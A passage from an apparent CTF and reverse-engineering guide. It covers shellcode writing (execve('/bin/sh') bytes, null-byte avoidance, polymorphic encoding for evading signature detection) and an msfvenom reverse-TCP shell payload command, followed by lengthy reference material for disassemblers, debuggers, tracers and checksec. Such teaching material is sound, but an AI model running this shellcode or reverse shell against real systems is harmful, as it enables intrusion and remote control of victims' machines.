    "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main() {
    printf("Shellcode length: %lu\n", strlen(shellcode));
    void (*func)() = (void(*)())shellcode;
    func();
    return 0;
}
```

```bash
# Compile with executable stack
gcc -z execstack -fno-stack-protector test.c -o test
./test
```

### x86-64 Linux Shellcode Example

**execve("/bin/sh") shellcode** (27 bytes):

```asm
global _start

_start:
    xor rax, rax            ; RAX = 0
    push rax                ; Push NULL terminator
    mov rbx, 0x68732f6e69622f2f  ; "//bin/sh"
    push rbx                ; Push string
    mov rdi, rsp            ; RDI = pointer to "/bin//sh"
    push rax                ; Push NULL
    push rdi                ; Push address of string
    mov rsi, rsp            ; RSI = argv
    xor rdx, rdx            ; RDX = NULL (envp)
    mov al, 59              ; sys_execve
    syscall                 ; Execute
```

**Shellcode bytes**:

```
\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05
```

### Null-Byte Avoidance Techniques

**Problem**: Many injection vectors (strcpy, gets) stop at null bytes.

**Techniques**:

1. **Use XOR to zero registers** instead of MOV:

```asm
; Bad (contains null bytes)
mov eax, 0              ; \xb8\x00\x00\x00\x00

; Good (no null bytes)
xor eax, eax            ; \x31\xc0
```

2. **Use smaller register moves**:

```asm
; Bad
mov eax, 0xb            ; \xb8\x0b\x00\x00\x00

; Good
mov al, 0xb             ; \xb0\x0b
```

3. **Use arithmetic operations**:

```asm
; Set EAX to 11 without null bytes
xor eax, eax            ; EAX = 0
mov al, 11              ; AL = 11
```

4. **Push multi-byte values strategically**:

```asm
; Avoid null bytes in string by using "//" instead of "/\0"
push 0x68732f2f         ; "//sh" (no null bytes)
```

5. **Use CDQ for zeroing EDX on x86**:

```asm
xor eax, eax
cdq                     ; EDX = 0 if EAX >= 0 (sign-extend EAX to EDX:EAX)
```

### Position-Independent Shellcode

**Problem**: Shellcode must work regardless of where it's loaded in memory.

**Techniques**:

1. **Use relative addressing** (x86-64):

```asm
lea rdi, [rel string]   ; Load address relative to RIP
```

2. **Use stack for data** (x86/x86-64):

```asm
push 0x68732f2f
push 0x6e69622f
mov ebx, esp            ; EBX now points to string on stack
```

3. **Call/Pop technique** for getting PC:

```asm
call get_eip
get_eip:
    pop ebx             ; EBX = current EIP
    ; Now use EBX as base for relative addressing
```

4. **JMP-CALL-POP technique**:

```asm
    jmp short data
code:
    pop esi             ; ESI = address of data
    ; Use ESI to access data
data:
    call code
    db "/bin/sh", 0
```

### Shellcode Encoding

Sometimes alphanumeric-only or printable-only shellcode is required.

**Alphanumeric shellcode**: All bytes are in ranges 0x30-0x39, 0x41-0x5a, 0x61-0x7a.

**Example approach** (x86):

- Use only alphanumeric instructions
- Build decoder stub using alphanumeric bytes
- Decoder decodes actual shellcode at runtime

**Tools**:

```bash
# Metasploit msfvenom with encoding
msfvenom -p linux/x86/exec CMD=/bin/sh -f c -e x86/alpha_mixed

# Manual encoding with custom scripts
python encode_alpha.py shellcode.bin
```

**[Inference]**: Alphanumeric shellcode is significantly larger and more complex than standard shellcode. The exact implementation depends on the target architecture and constraints.

### Polymorphic Shellcode

Shellcode that changes its appearance while maintaining functionality, used to evade signature-based detection.

**Techniques**:

- Use different instruction sequences with same result
- Add junk instructions (NOPs, redundant operations)
- XOR encoding with variable keys
- Instruction substitution

**Example**:

```asm
; Original
xor eax, eax

; Polymorphic variations
sub eax, eax            ; Same result
and eax, 0              ; Same result
imul eax, 0             ; Same result
xor eax, eax
nop                     ; Add junk
xor eax, eax
```

### Shellcode Development Tools

**pwntools** (Python):

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# Generate shellcode
shellcode = asm(shellcraft.amd64.linux.sh())
print(hexdump(shellcode))
print(disasm(shellcode))

# Or manual assembly
shellcode = asm('''
    xor rax, rax
    push rax
    mov rbx, 0x68732f6e69622f2f
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp
    xor rdx, rdx
    mov al, 59
    syscall
''')
```

**Metasploit Framework**:

```bash
# Generate various payloads
msfvenom -p linux/x86/exec CMD=/bin/sh -f c
msfvenom -p linux/x64/exec CMD=/bin/sh -f python
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw

# List available payloads
msfvenom -l payloads | grep linux

# Encode to avoid bad characters
msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00\x0a\x0d' -f c
```

**Online assemblers**:

- [defuse.ca/online-x86-assembler.htm](https://defuse.ca/online-x86-assembler.htm)
- Quick testing without local toolchain

## Reading Assembly in CTF Challenges

### Identifying Function Boundaries

Without symbols, identify functions by:

- Prologue patterns: `push rbp; mov rbp, rsp`
- Epilogue patterns: `leave; ret` or `pop rbp; ret`
- Call targets
- Jump destinations

```bash
# In radare2
r2 binary
aa              # Analyze all
afl             # List functions
pdf @ main      # Disassemble function

# In GDB with pwndbg
gdb binary
info functions
disas main
```

### Recognizing Common Patterns

**String operations**:

```asm
; strcpy pattern
call strcpy
; Or manual loop
.loop:
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    test al, al
    jne .loop
```

**Loops**:

```asm
; for (i = 0; i < 10; i++)
xor ecx, ecx            ; i = 0
.loop:
    ; Loop body
    inc ecx             ; i++
    cmp ecx, 10         ; i < 10?
    jl .loop            ; Continue if less
```

**Conditional statements**:

```asm
; if (eax == 0)
test eax, eax
jne .else_branch
    ; True branch
    jmp .end
.else_branch:
    ; False branch
.end:
```

**Switch statements** (jump tables):

```asm
cmp eax, 5              ; Check if case > max
ja .default             ; Jump to default if out of range
lea rbx, [jump_table]
mov rax, [rbx + rax*8]  ; Get address from table
jmp rax                 ; Jump to case

.section .rodata
jump_table:
    .quad .case0
    .quad .case1
    .quad .case2
    ; ...
```

### Decompiling Assembly to Pseudocode

**Manual approach**:

1. Identify function parameters (registers or stack)
2. Track variable usage
3. Identify control flow (if/else, loops)
4. Reconstruct high-level logic

**Example**:

```asm
push rbp
mov rbp, rsp
mov [rbp-0x4], edi      ; Store first parameter
cmp dword [rbp-0x4], 0xa
jle .L2
    mov eax, 0x1
    jmp .L3
.L2:
    mov eax, 0x0
.L3:
    pop rbp
    ret
```

**Reconstructed C**:

```c
int function(int arg1) {
    if (arg1 > 10) {
        return 1;
    } else {
        return 0;
    }
}
```

**Automated tools**:

```bash
# Ghidra decompiler (GUI)
ghidra

# radare2 with r2ghidra plugin
r2 binary
aaa             # Deep analysis
pdg @ main      # Print decompiled graph

# IDA Pro / IDA Free (GUI)
ida64 binary    # F5 to decompile
```

**[Inference]**: Automated decompilers produce approximations. The output may not perfectly match the original source and should be verified against the actual assembly.

## Debugging Assembly

### GDB Essential Commands

```bash
# Start debugging
gdb ./binary

# Set Intel syntax (more readable)
set disassembly-flavor intel

# Run program
run
run arg1 arg2

# Set breakpoints
break main
break *0x401234            # Break at address
break *main+42             # Offset from symbol

# Examine registers
info registers             # All registers
info registers rax rbx     # Specific registers
p/x $rax                   # Print RAX in hex

# Examine memory
x/10wx $rsp                # 10 words at stack pointer
x/s 0x401000               # String at address
x/10i $rip                 # 10 instructions at current location

# Step through code
si                         # Step instruction (into calls)
ni                         # Next instruction (over calls)
finish                     # Run until function returns
continue                   # Continue execution

# Disassemble
disas main
disas $rip, $rip+100       # Disassemble range

# Modify execution
set $rax=0x1234            # Change register
set {int}0x401000=0x90     # Write to memory
jump *0x401234             # Jump to address
```

### pwndbg / peda / gef

Enhanced GDB interfaces with better visualization:

```bash
# Install pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# In GDB with pwndbg
context                    # Show registers, code, stack
vmmap                      # Show memory mappings
telescope $rsp 20          # Examine stack with dereferencing
cyclic 200                 # Generate cyclic pattern
cyclic -l 0x61616162       # Find offset in pattern
rop                        # Search for ROP gadgets
got                        # Display GOT entries
```

### Dynamic Analysis Tips

**Finding crash offsets**:

```bash
# Generate pattern
gdb ./binary
cyclic 200
run < <(cyclic 200)
# On crash:
cyclic -l $rsp             # Or cyclic -l [value in register]
```

**Tracing execution**:

```bash
# GDB
catch syscall              # Break on system calls
catch signal               # Break on signals

# strace
strace ./binary            # Trace system calls
ltrace ./binary            # Trace library calls
```

**Examining library calls**:

```bash
# Find libc functions
p system                   # Print address of system
p &system
find &system, +9999999, "/bin/sh"  # Search for string in memory
```

This comprehensive foundation in assembly language for x86, x86-64, and ARM architectures provides the essential knowledge needed for reverse engineering binaries, understanding exploitation techniques, crafting shellcode, and solving CTF challenges across multiple platforms.

---

# Reconnaissance & Analysis Tools

## File Identification Utilities

### file Command

The `file` command uses magic bytes and file signatures to identify file types, essential for understanding unknown binary formats.

**Basic syntax:**

```bash
file <filename>
file -b <filename>              # Brief mode (omit filename)
file -i <filename>              # MIME type output
file -z <filename>              # Look inside compressed files
file -L <filename>              # Follow symlinks
file -s <device>                # Read block/character special files
```

**CTF applications:**

- Identifying stripped binaries vs. debug builds
- Detecting architecture (x86, x64, ARM, MIPS)
- Revealing file obfuscation (executables disguised as images)
- Determining endianness and linking type (static/dynamic)

**Output interpretation:**

```bash
file binary
# ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

Key indicators: architecture (x86-64), linking (dynamically linked), symbols (not stripped)

### strings Command

Extracts printable character sequences from binary files, revealing hardcoded strings, function names, and potential vulnerabilities.

**Basic syntax:**

```bash
strings <filename>
strings -n <min_length> <filename>     # Minimum string length (default 4)
strings -a <filename>                  # Scan entire file
strings -t x <filename>                # Print offset in hexadecimal
strings -t d <filename>                # Print offset in decimal
strings -e s <filename>                # 7-bit strings
strings -e S <filename>                # 8-bit strings
strings -e l <filename>                # 16-bit little-endian
strings -e b <filename>                # 16-bit big-endian
```

**CTF techniques:**

```bash
# Find interesting strings with context
strings -n 8 binary | grep -i "flag\|password\|key"

# Extract with offsets for later reference
strings -t x binary > strings_output.txt

# Wide character strings (Windows binaries)
strings -e l binary.exe

# Combine with file sections analysis
strings -a -t x binary | grep -A5 -B5 "interesting_function"
```

**Common findings:**

- Flag formats (`flag{...}`, `CTF{...}`)
- Hardcoded credentials
- Function names in non-stripped binaries
- Error messages revealing logic
- Format string vulnerabilities (`%s`, `%x`, `%n`)

### binwalk

Firmware analysis tool that identifies embedded files, compressed data, and file system signatures within binary blobs.

**Basic syntax:**

```bash
binwalk <filename>
binwalk -e <filename>                  # Extract identified files
binwalk -E <filename>                  # Entropy analysis
binwalk -A <filename>                  # Scan for executable opcodes
binwalk --dd='.*' <filename>           # Extract all recognized types
binwalk -M -e <filename>               # Recursive extraction (matryoshka mode)
binwalk -R <pattern> <filename>        # Search for custom patterns
binwalk -D 'png image:png' <filename>  # Extract specific file type
```

**CTF applications:**

```bash
# Identify hidden data in images (steganography)
binwalk challenge.png

# Extract nested archives
binwalk -e firmware.bin

# Entropy analysis for crypto detection
binwalk -E binary | tee entropy.txt

# Search for custom magic bytes
binwalk -R '\x7fELF' combined.bin

# Recursive extraction with depth limit
binwalk -M --depth=3 -e nested.bin
```

**Entropy analysis interpretation:**

- High entropy (0.9-1.0) → Encrypted or compressed data
- Medium entropy (0.6-0.8) → Executable code
- Low entropy (0.0-0.5) → Text, padding, or repetitive data

**Output parsing:**

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 64-bit LSB executable
15632         0x3D10          gzip compressed data
```

---

## Disassemblers

### objdump

GNU binary utilities disassembler, standard tool for analyzing ELF binaries on Linux systems.

**Basic syntax:**

```bash
objdump -d <binary>                    # Disassemble executable sections
objdump -D <binary>                    # Disassemble all sections
objdump -M intel <binary>              # Intel syntax (default: AT&T)
objdump -S <binary>                    # Interleave source code (if available)
objdump -h <binary>                    # Display section headers
objdump -x <binary>                    # All headers
objdump -t <binary>                    # Symbol table
objdump -T <binary>                    # Dynamic symbol table
objdump -R <binary>                    # Dynamic relocations
```

**CTF workflow:**

```bash
# Full disassembly with Intel syntax
objdump -M intel -d binary > disasm.txt

# Find specific function
objdump -M intel -d binary | grep -A50 "<main>:"

# Identify interesting functions
objdump -t binary | grep -i "win\|flag\|backdoor\|admin"

# Check security features
objdump -x binary | grep -E "STACK|RELRO|PIE"

# Examine PLT/GOT entries
objdump -M intel -d binary | grep -A3 "@plt"

# Find string references
objdump -s -j .rodata binary
```

**Section analysis:**

```bash
# Code section
objdump -d -j .text binary

# Read-only data (strings, constants)
objdump -s -j .rodata binary

# Initialized data
objdump -s -j .data binary

# Global Offset Table
objdump -s -j .got.plt binary
```

### radare2 (r2)

Powerful open-source reverse engineering framework with extensive analysis capabilities.

**Basic workflow:**

```bash
r2 -A binary                           # Open with automatic analysis
r2 -d binary                           # Debug mode
r2 -w binary                           # Write mode (patch binary)
r2 -AA binary                          # Deeper analysis
```

**Essential commands inside r2:**

```
# Analysis
aaa                                    # Analyze all (functions, references, symbols)
aaaa                                   # Even deeper analysis
af                                     # Analyze function
afl                                    # List all functions
afll                                   # List functions with details
axt @ <address>                        # Cross-references to address
axf @ <address>                        # Cross-references from address

# Information
ii                                     # Imports
iI                                     # Binary info
iz                                     # Strings in data sections
izz                                    # Strings in whole binary
ie                                     # Entry points
iS                                     # Sections with permissions

# Disassembly
pdf @ main                             # Disassemble function (print disassembly function)
pd 20                                  # Disassemble 20 instructions
pD 100                                 # Disassemble 100 bytes
s main; V                              # Seek to main, enter visual mode

# Visual mode (press V after opening)
p/P                                    # Cycle between visual modes
:                                      # Enter command mode
hjkl                                   # Navigate (vim-style)
d                                      # Define function
x                                      # Cross-references
v                                      # Visual function graph

# Search
/ <pattern>                            # Search bytes/string
/R                                     # Search ROP gadgets
/c                                     # Search for crypto constants
```

**CTF-specific commands:**

```bash
# Find win/flag functions
afl | grep -i "win\|flag\|backdoor"

# Search for specific instructions
"/c int 0x80"                          # Find syscalls

# ROP gadget searching
"/R pop rdi; ret"

# Patch binary in write mode
r2 -w binary
> s 0x08048484                         # Seek to address
> wx 9090                              # Write NOP bytes (0x90)
> q                                    # Quit (saves changes)

# Emulation for dynamic analysis
aei                                    # Initialize VM
aeim                                   # Initialize memory
aeip                                   # Set IP to entry point
aer                                    # Show register values
```

**Graph visualization:**

```
VV                                     # Visual graph mode
```

### Ghidra

NSA's open-source reverse engineering suite with decompiler, excellent for understanding program logic.

**Interface overview:**

- CodeBrowser: Main analysis window
- Decompiler: C-like pseudocode generation
- Listing: Disassembly view
- Symbol Tree: Functions, labels, data structures

**Workflow:**

1. Import binary → Auto-analysis (say yes to all defaults)
2. Navigate to `entry` or `main` in Symbol Tree
3. Review decompiler output alongside disassembly
4. Rename variables/functions for clarity
5. Add comments at critical points

**Key features for CTF:**

- **Decompiler:** Converts assembly to readable C-like code
- **Function call graph:** Visualize execution flow
- **Data type editor:** Define custom structures
- **Scripting:** Python/Java automation for repetitive tasks
- **Diff tool:** Compare binary versions

**Useful windows:**

- **Defined Strings:** Find all strings in binary (Window → Defined Strings)
- **Function Call Trees:** Trace function relationships
- **Program Trees:** View binary segments and sections
- **Memory Map:** Examine loaded sections and permissions

**Keyboard shortcuts:**

```
G          - Go to address
L          - Add label
;          - Add comment
Ctrl+E     - Set function signature
Ctrl+Shift+G - Find references to address
```

[Inference] Ghidra's decompiler quality typically exceeds other open-source alternatives, though output still requires manual interpretation and may contain errors.

### IDA Free

Industry-standard disassembler (free version limited to x86/x64, no decompiler in free tier).

**Key capabilities (Free version):**

- Interactive disassembly with color-coding
- Cross-reference tracking (Xrefs)
- Debugger integration
- Function recognition and graphing
- Structure and enum definitions

**Navigation:**

```
Space      - Toggle graph/text view
X          - Cross-references to location
Ctrl+X     - Cross-references from location
N          - Rename symbol
;          - Add comment
G          - Jump to address
Esc        - Go back
Tab        - Switch to pseudocode (Pro only)
```

**CTF workflow:**

1. Load binary → Let IDA analyze completely
2. Jump to `start` or `main` (press G, type function name)
3. Use graph view (Space) to understand control flow
4. Follow cross-references (X) to trace data/function usage
5. Rename functions (N) as you identify their purpose

**Important windows:**

- **Functions window:** List all recognized functions
- **Strings window:** View all strings (Shift+F12)
- **Imports/Exports:** Examine external library usage
- **Structures:** Define binary data layouts

[Unverified] The free version may have limitations with obfuscated code compared to commercial alternatives, though it remains highly effective for standard CTF binaries.

---

## Debuggers

### GDB (GNU Debugger)

Standard debugger for Linux binaries, essential for runtime analysis and exploitation development.

**Basic syntax:**

```bash
gdb <binary>
gdb -q <binary>                        # Quiet mode (no banner)
gdb -p <pid>                           # Attach to running process
gdb --args <binary> <arg1> <arg2>      # Pass arguments
```

**Essential commands:**

```gdb
# Execution control
run <args>                             # Start program
r < input.txt                          # Run with stdin from file
start                                  # Break at entry point
continue / c                           # Continue execution
next / n                               # Step over (source level)
step / s                               # Step into (source level)
nexti / ni                             # Step over (instruction level)
stepi / si                             # Step into (instruction level)
finish                                 # Run until function returns
until <location>                       # Run until location

# Breakpoints
break main / b main                    # Break at function
break *0x08048484                      # Break at address
break file.c:42                        # Break at source line
delete <num>                           # Delete breakpoint number
disable/enable <num>                   # Disable/enable breakpoint
info breakpoints / i b                 # List breakpoints
condition <num> <expr>                 # Conditional breakpoint

# Examination
x/20wx $esp                            # Examine 20 words (hex) at ESP
x/10i $eip                             # Examine 10 instructions at EIP
x/s 0x08048590                         # Examine string at address
x/20gx $rsp                            # Examine 20 giant (8-byte) words (x64)

# Format specifiers for 'x' command:
# x = hex, d = decimal, u = unsigned, o = octal, t = binary
# b = byte, h = halfword, w = word, g = giant (8 bytes)
# i = instruction, s = string

# Registers
info registers / i r                   # All registers
info registers rax rdi                 # Specific registers (x64)
set $eip = 0x08048400                  # Modify register

# Memory
dump memory output.bin 0x08048000 0x08049000
find 0x08048000, +0x1000, "flag"      # Search memory
set {int}0x08048400 = 0x90909090      # Write to memory

# Stack and backtrace
backtrace / bt                         # Stack trace
info frame                             # Current frame details
up / down                              # Navigate stack frames

# Other
info functions                         # List all functions
info variables                         # List all variables
disassemble main / disas main          # Disassemble function
set disassembly-flavor intel           # Switch to Intel syntax
```

**CTF techniques:**

```bash
# Pattern generation for offset finding (external tools needed)
# Use pwntools or Metasploit pattern_create

# Find offset after crash
gdb -q binary
(gdb) run < payload.txt
# Check crash address
(gdb) info registers eip
# Use pattern_offset to find distance

# Examine buffer overflow
(gdb) break *vulnerable_function+56
(gdb) run < input.txt
(gdb) x/40wx $esp
# Analyze stack layout

# Script automation
gdb -q -x script.gdb binary
# Contents of script.gdb:
# break *main+42
# run
# x/20wx $esp
# continue
```

### pwndbg

Modern GDB enhancement with exploit development features, color-coded output, and automation.

**Installation:**

```bash
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

**Automatic features:**

- Context display (registers, disassembly, stack, backtrace)
- Color-coded output
- Automatic ASLR/PIE detection
- Enhanced heap visualization

**Additional commands:**

```
# Enhanced examination
telescope <address> [count]            # Recursive pointer dereferencing
hexdump <address>                      # Clean hexdump output
context                                # Refresh context display

# Exploitation helpers
cyclic 100                             # Generate De Bruijn pattern
cyclic -l 0x61616162                   # Find pattern offset
rop                                    # List ROP gadgets
search "flag"                          # Search memory for string
vmmap                                  # Display memory mappings
checksec                               # Binary security features

# Heap analysis
heap                                   # Heap chunks visualization
bins                                   # Display heap bins
vis_heap_chunks                        # Visual heap layout
arena                                  # Arena information

# Format string helpers
fmtstr 6                               # Calculate format string offset
```

**Context configuration:**

```
context-sections "regs disasm code stack backtrace"
context-code-lines 10
context-stack-lines 8
```

### GEF (GDB Enhanced Features)

Alternative GDB enhancement similar to pwndbg with additional reverse engineering features.

**Installation:**

```bash
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

**Unique features:**

```
# Pattern finding
pattern create 100                     # Generate pattern
pattern search                         # Find pattern in registers/memory
pattern offset $eip                    # Calculate offset

# Architecture handling
gef config context.arch i386           # Force architecture

# Security checksec
checksec                               # Binary security features
canary                                 # Check stack canary

# Reverse engineering
xref <address>                         # Cross-references
trace-run                              # Instruction trace

# Shellcode helpers
shellcode search x86                   # Search shellcode database
shellcode get 60                       # Get shellcode by ID

# Memory mapping
xfiles                                 # Display open file descriptors
xinfo <address>                        # Detailed address information
```

[Inference] Choice between pwndbg and GEF is largely preference-based; both provide similar core functionality with different interface aesthetics and minor feature variations.

### edb (Evan's Debugger)

Graphical Linux debugger with IDA-like interface, useful for visual analysis.

**Installation:**

```bash
sudo apt install edb-debugger
```

**Features:**

- Visual disassembly with graph view
- Memory dump visualization
- Register window with real-time updates
- Plugin architecture
- Heap visualization plugin

**Use cases:**

- Quick visual inspection without GDB complexity
- Analyzing obfuscated code with graph view
- Memory pattern recognition
- When GUI is preferred over CLI

**Limitations:** [Inference] Less actively maintained than GDB-based tools; may have compatibility issues with modern binaries or kernel versions.

---

## Dynamic Analysis Tools

### strace

System call tracer, captures all interactions between a process and the kernel.

**Basic syntax:**

```bash
strace <binary>
strace -e <syscall> <binary>           # Trace specific syscall
strace -c <binary>                     # Summary statistics
strace -f <binary>                     # Trace child processes
strace -p <pid>                        # Attach to running process
strace -o output.txt <binary>          # Write to file
strace -s <size> <binary>              # String capture size (default 32)
strace -x <binary>                     # Hex output for strings
strace -xx <binary>                    # All bytes in hex
```

**CTF techniques:**

```bash
# Trace file operations
strace -e trace=file binary

# Trace network operations
strace -e trace=network binary

# Trace specific syscalls
strace -e open,read,write binary

# Capture full strings (flag hunting)
strace -s 1000 binary

# Trace with timestamps
strace -t binary                       # Time of day
strace -r binary                       # Relative timestamps
strace -T binary                       # Time spent in syscall

# Filter noise
strace -e '!clock_gettime,mmap,munmap' binary

# Trace child processes (fork analysis)
strace -f -e trace=process binary
```

**Common syscalls to monitor:**

- `open/openat`: File access (look for flag files)
- `read/write`: I/O operations
- `connect/send/recv`: Network communication
- `execve`: Program execution
- `ptrace`: Anti-debugging detection
- `mmap/mprotect`: Memory manipulation
- `prctl`: Process control (sandbox detection)

**Example output interpretation:**

```
open("/home/user/flag.txt", O_RDONLY) = 3
read(3, "flag{example_flag_here}\n", 4096) = 24
```

Clear indication of flag file access.

### ltrace

Library call tracer, captures calls to shared library functions.

**Basic syntax:**

```bash
ltrace <binary>
ltrace -c <binary>                     # Summary statistics
ltrace -f <binary>                     # Trace child processes
ltrace -o output.txt <binary>          # Write to file
ltrace -s <size> <binary>              # String size (default 32)
ltrace -e <function> <binary>          # Trace specific function
ltrace -x <function> <binary>          # Trace specific library function
ltrace -i <binary>                     # Print instruction pointer
```

**CTF techniques:**

```bash
# Trace string operations
ltrace -e 'strcmp+strcpy+strncmp+strlen' binary

# Capture input validation
ltrace -e strcmp binary
# Look for: strcmp("user_input", "expected_password")

# Memory allocation tracking
ltrace -e 'malloc+free+calloc+realloc' binary

# Trace custom library
ltrace -l /lib/x86_64-linux-gnu/libc.so.6 binary

# Full string capture
ltrace -s 1000 binary | grep -i "flag\|pass"

# Combine with strace for complete picture
ltrace -o ltrace.log binary &
strace -o strace.log binary
```

**Common functions to monitor:**

- `strcmp/strncmp`: Password/flag comparison
- `printf/scanf`: I/O formatting (format string vulns)
- `gets/fgets`: Input functions (buffer overflow vectors)
- `system/execve`: Command execution
- `malloc/free`: Heap operations
- `rand/srand`: Random number generation (predictability)

**Example flag leak:**

```
strcmp("user_input", "secret_password_123") = -1
```

Directly reveals expected password in cleartext.

**Advantages over strace:**

- Higher-level function visibility (easier to understand logic)
- Captures argument values before processing
- Better for password/key extraction

**Limitations:** [Inference] Statically-linked binaries bypass libc, making ltrace ineffective; strace remains reliable in these cases.

---

## Tool Selection Strategy

**Initial reconnaissance:**

1. `file` → Identify binary type and architecture
2. `strings` → Quick flag/password search
3. `checksec` (from pwndbg/GEF) → Security features

**Static analysis:**

1. `objdump -d` → Quick disassembly for simple binaries
2. `radare2` → Medium complexity, scripting needs
3. `Ghidra` → Complex logic requiring decompilation

**Dynamic analysis:**

1. `ltrace` → Library call level (most readable)
2. `strace` → System call level (more complete)
3. `GDB with pwndbg/GEF` → Full control, exploitation dev

**Debugging approach:**

- Start with `ltrace`/`strace` for black-box understanding
- Switch to GDB when you need breakpoints or memory inspection
- Use Ghidra when assembly analysis is too time-consuming

---

**Important related topics:**

- **Checksec tools** (security feature identification: NX, ASLR, PIE, RELRO, Canary)
- **Binary patching techniques** (hex editors, radare2, GDB scripting)
- **Anti-debugging detection** (ptrace detection, timing attacks, signal handlers)

---

## Hex Editors

Hex editors provide raw binary inspection essential for understanding binary structure, identifying data patterns, and locating embedded strings or shellcode during CTF exploitation.

**hexdump**

The fundamental command-line hex viewer for quick binary inspection:

```bash
hexdump -C /path/to/binary | head -50
```

The `-C` flag produces canonical hex output with ASCII representation. For targeted inspection of specific byte ranges:

```bash
hexdump -C -n 512 -s 0x1000 /path/to/binary
```

The `-n` parameter limits bytes displayed, `-s` seeks to an offset. For finding patterns across large binaries:

```bash
hexdump -C /path/to/binary | grep "deadbeef"
```

**xxd**

More human-readable than hexdump with superior copy-paste capabilities:

```bash
xxd /path/to/binary | head -100
xxd -g 1 /path/to/binary
```

The `-g` parameter controls byte grouping. For binary editing in-place through xxd's reversible format:

```bash
xxd /path/to/binary > binary.hex
# Edit binary.hex
xxd -r binary.hex > binary.modified
```

**radare2 (r2)**

Integrated binary analysis with hexadecimal viewing as one component:

```bash
r2 /path/to/binary
> px 256          # Print 256 bytes in hex
> px @ 0x400000   # Hex dump at specific address
> s 0x401234      # Seek to address
> px 64           # Print hex from current position
```

**GDB with hex inspection**

During live debugging, examine memory in hexadecimal format:

```bash
gdb ./binary
(gdb) x/64bx $rsp              # Examine 64 bytes at RSP as hex
(gdb) x/16gx 0x7ffffffde000   # Examine 16 giant words (8 bytes)
(gdb) dump memory dump.bin 0x7ffff7dd9000 0x7ffff7dd9100
```

The output format `x/[count][format][size]` where format includes `x` (hex), `s` (string), `i` (instruction), and size includes `b` (byte), `h` (halfword), `w` (word), `g` (giant).

**Binary Ninja and IDA Pro**

Commercial/premium tools with superior hex viewing integrated into disassembly context. Binary Ninja's free tier includes hex view synchronized with disassembly.

---

## Binary Diffing Tools

Diffing identifies changes between binary versions, helping locate vulnerability patches, anti-analysis modifications, or differences between local and target binaries.

**bindiff**

Google's specialized binary differ, most powerful for identifying structural changes:

```bash
bindiff /path/to/binary1 /path/to/binary2
```

Produces database output analyzable in IDA Pro or Binary Ninja. Command-line usage requires GUI interaction typically, but results show function-level changes with similarity percentages.

**radare2 diffing**

```bash
r2 -d /path/to/binary1
> fc /path/to/binary2    # Function comparison
```

For more granular diffing via radare2:

```bash
r2 /path/to/binary1
> aaa                           # Analyze all
> fl > functions1.txt           # Export function list
```

Then compare function lists manually or script comparison.

**objdump with diff**

Extract disassembly from both binaries and use standard diff:

```bash
objdump -d /path/to/binary1 > binary1.asm
objdump -d /path/to/binary2 > binary2.asm
diff -u binary1.asm binary2.asm | less
```

Identifies instruction-level changes. For focusing on specific sections:

```bash
objdump -d -j .text /path/to/binary1 > text1.asm
```

The `-j` parameter selects individual sections.

**strings and grep comparison**

Quick identification of added/removed strings:

```bash
strings /path/to/binary1 | sort > strings1.txt
strings /path/to/binary2 | sort > strings2.txt
diff strings1.txt strings2.txt
```

Reveals error messages, debug info, or hardcoded values changed between versions.

**Binary Ninja comparison view**

Binary Ninja's UI provides side-by-side function comparison with graph visualization. Particularly effective for control flow changes identifying vulnerability patches.

**fuzzy matching with radare2**

For more sophisticated analysis:

```bash
r2 /path/to/binary1
> aa                    # Analyze
> z ~function_name      # Fuzzy search functions
> pdf @ function_addr   # Print disassembly
```

---

## Checksec and Security Property Analysis

Checksec reveals exploit mitigations active on the binary, immediately informing exploitation strategy regarding stack canaries, ASLR, DEP/NX, and PIE.

**checksec**

The standard reconnaissance tool:

```bash
checksec --file=/path/to/binary
```

Output example interpretation:

```
RELRO           : Full    # Full relocation read-only, prevents GOT overwrite
STACK CANARY    : Enabled # Stack smashing detector active
NX              : Enabled # No-execute bit, stack not executable
PIE             : Enabled # Position Independent Executable
RPATH           : No
RUNPATH         : No
Symbols         : Yes     # Debugging symbols present
FORTIFY         : Enabled # Compiler fortification checks
Clang CFI       : No      # Control flow integrity absent
ShadowCallStack : No
```

**readelf for detailed ELF analysis**

```bash
readelf -e /path/to/binary                 # Full ELF header
readelf -S /path/to/binary                 # Section headers
readelf -l /path/to/binary                 # Program headers (reveals PT_GNU_STACK)
readelf -d /path/to/binary | grep FLAGS    # Dynamic section flags
```

PT_GNU_STACK with `RWE` indicates executable stack (no NX), `RW-` indicates NX enabled.

**file command for quick assessment**

```bash
file /path/to/binary
```

Output like `ELF 64-bit LSB executable, x86-64` indicates architecture and basic properties. For detailed flag information:

```bash
file -e elf /path/to/binary
```

**objdump for RELRO verification**

```bash
objdump -R /path/to/binary | head -20
```

Shows relocations. Full RELRO eliminates this output or significantly reduces it.

**ldd for dependency and ASLR detection**

```bash
ldd /path/to/binary
```

Running multiple times reveals ASLR state—consistent addresses indicate ASLR disabled at binary level, variable addresses indicate ASLR active. Example:

```bash
$ ldd ./binary
    linux-vdso.so.1 (0x00007ffcc77fe000)
$ ldd ./binary
    linux-vdso.so.1 (0x00007fffbd5fe000)
```

Different vdso addresses confirm ASLR. [Inference] This assumes system-level ASLR is enabled; per-binary ASLR depends on PIE.

**gdb for runtime verification**

```bash
gdb -q ./binary
(gdb) info proc mappings    # Show actual memory layout during execution
(gdb) break main
(gdb) run
(gdb) info proc mappings    # Compare with static expectation
```

Stack canary presence during execution:

```bash
(gdb) disassemble main
```

Look for `mov qword ptr [rbp-0x8], rax` or similar—canary placement before return address.

**rabin2 (radare2 binary info)**

Integrated security analysis:

```bash
rabin2 -I /path/to/binary
```

